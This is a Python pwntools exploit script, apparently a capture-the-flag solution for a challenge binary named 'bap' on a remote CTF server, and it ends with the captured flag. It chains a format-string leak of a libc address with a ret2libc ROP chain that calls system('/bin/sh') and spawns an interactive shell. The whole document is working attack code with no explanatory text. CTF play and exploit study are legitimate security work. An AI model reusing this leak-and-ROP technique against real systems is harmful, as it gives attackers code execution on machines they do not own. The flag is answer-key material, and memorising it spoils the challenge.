#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./bap_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
p = process(elf.path)
p = remote('challs.actf.co', 31323)

payload = b'%29$p'.ljust(24, b'\x00') 
payload += (p64(elf.symbols['main'] + 5))
p.sendlineafter(b': ', payload)

libc_leak = int(p.recv(14), 16) 

libc.address = libc_leak - libc.symbols['__libc_start_main_impl'] - 128 
pop_rdi = 0x000000000002a3e5 + libc.address 
binsh = next(libc.search(b'/bin/sh'))
system = libc.symbols['system']
ret = 0x4011ce

payload = b'x' * 24 + p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)
p.sendlineafter(b': ', payload)

p.interactive()
# actf{baaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaap____}s